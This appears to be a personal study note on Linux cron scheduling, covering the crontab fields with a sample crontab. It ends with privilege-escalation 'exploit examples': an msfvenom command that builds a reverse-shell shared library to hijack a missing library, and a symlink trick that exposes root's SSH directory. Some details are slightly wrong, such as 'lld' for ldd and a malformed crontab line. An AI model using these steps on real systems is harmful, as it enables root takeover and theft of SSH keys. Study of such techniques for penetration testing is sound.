---
tags:
  - OperatingSystems
  - Linux
  - TaskScheduling
  - StandardInformation
---
[Linux Privilege Escalation by Exploiting Cronjobs - Hacking Articles](https://www.hackingarticles.in/linux-privilege-escalation-by-exploiting-cron-jobs/)
[Cron Jobs – Linux Privilege Escalation - Juggernaut-Sec](https://juggernaut-sec.com/cron-jobs-lpe/)

Cron is another tool that can be used in Linux systems to schedule and automate processes. It allows users and administrators to execute tasks at a specific time or within specific intervals. For the above examples, we can also use Cron to automate the same tasks. We just need to create a script and then tell the cron daemon to call it at a specific time.

Similar vulnerabilities to [[AutoRun SysInternals]] and similar to [[Scheduled Tasks]]
# Guide
To set up the cron daemon, we need to store the tasks in a file called `crontab` and then tell the daemon when to run the tasks.

The structure of Cron consists of the following components:

|**Time Frame**|**Description**|
|---|---|
|Minutes (0-59)|This specifies in which minute the task should be executed.|
|Hours (0-23)|This specifies in which hour the task should be executed.|
|Days of month (1-31)|This specifies on which day of the month the task should be executed.|
|Months (1-12)|This specifies in which month the task should be executed.|
|Days of the week (0-7)|This specifies on which day of the week the task should be executed.|

For example, such a crontab could look like this:

Code: txt

```txt
# System Update
* */6 * * /path/to/update_software.sh

# Execute scripts
0 0 1 * * /path/to/scripts/run_scripts.sh

# Cleanup DB
0 0 * * 0 /path/to/scripts/clean_database.sh

# Backups
0 0 * * 7 /path/to/scripts/backup.sh
```





# Exploit Examples

## Compiled Program

1. Run `lld` on the program

```
linux-vdso.so.1 =>  (0x00007ffd61a5c000)
        utils.so => not found
        libc.so.6 => /lib64/libc.so.6 (0x00007f717136a000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f7171738000)
```

2. Generate a malicious shared object file named `utils.so` and place it in the `/usr/local/lib/dev directory`.

```
msfvenom -p linux/x64/shell_reverse_tcp -f elf-so -o utils.so LHOST=kali 
```

3. Link the file:

```
 ln -s /root/.ssh /tmp/backup/-root-.ssh
```